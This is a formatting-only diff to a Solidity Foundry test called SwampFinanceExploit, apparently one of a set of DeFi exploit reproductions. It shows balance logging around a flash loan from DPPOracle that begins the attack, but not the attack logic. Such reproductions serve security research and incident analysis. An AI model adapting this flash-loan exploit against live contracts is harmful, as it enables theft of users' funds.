@@ -21,7 +21,9 @@ import "./../interface.sol";
 interface IbeltBNB {
     function approve(address spender, uint256 amount) external returns (bool);
 
-    function balanceOf(address owner) external view returns (uint256);
+    function balanceOf(
+        address owner
+    ) external view returns (uint256);
 
     function transferFrom(address from, address to, uint256 value) external returns (bool);
 
@@ -75,17 +77,13 @@ contract SwampFinanceExploit is Test {
         deal(address(beltBNB), address(this), 1_272_113_372_028_660);
 
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance before attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
 
-        DPPOracle.flashLoan(3_100e18, 150_000e18, address(this), bytes("_"));
+        DPPOracle.flashLoan(3100e18, 150_000e18, address(this), bytes("_"));
 
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance after attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
     }
 
